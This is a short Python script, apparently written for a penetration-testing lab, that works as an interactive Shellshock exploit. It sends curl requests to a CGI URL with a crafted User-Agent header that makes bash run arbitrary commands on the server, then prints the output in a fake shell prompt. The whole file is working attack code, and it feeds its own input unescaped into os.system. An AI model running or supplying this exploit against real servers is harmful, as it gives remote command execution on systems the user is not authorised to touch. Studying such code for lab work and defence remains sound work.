#!/usr/bin/python

# python wrapper to execute shellshock commands
# sl0w - 11/1/19 

import os 
import sys
from optparse import OptionParser
parser = OptionParser()
parser.add_option("-u", "--uri", dest='uri', help="python shellshock.py -u http://10.11.1.71/cgi-bin/admin.cgi")
(options, args) = parser.parse_args()
assert 'http://' in options.uri,"python exploit.py -u http://10.11.1.71/cgi-bin/admin.cgi"
assert '/cgi-bin/' in options.uri,"python exploit.py -u http://10.11.1.71/cgi-bin/admin.cgi"
options.cmd = 'id'
while options.cmd != 'q' and options.cmd != 'quit':
  shellshock = "curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c \'" + options.cmd + "\'\" " + options.uri
  os.system(shellshock+ " | tail -n+3 | sed '$d' ")
  options.cmd = raw_input("cgi@shell:~$ ")

